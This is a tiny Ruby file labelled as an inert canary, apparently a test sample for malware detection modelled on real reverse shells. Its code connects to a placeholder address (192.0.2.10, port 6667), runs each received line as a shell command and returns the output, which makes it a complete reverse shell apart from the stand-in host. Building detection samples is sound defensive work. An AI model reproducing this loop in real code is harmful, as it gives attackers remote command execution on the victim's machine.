# INERT CANARY: remote command loop (shape of real Ruby reverse shells in malcontent-samples)
require 'socket'
require 'open3'
sock = TCPSocket.new "192.0.2.10", 6667
while line = sock.gets
  Open3.popen2e("#{line}") { |i, o| IO.copy_stream(o, sock) }
end
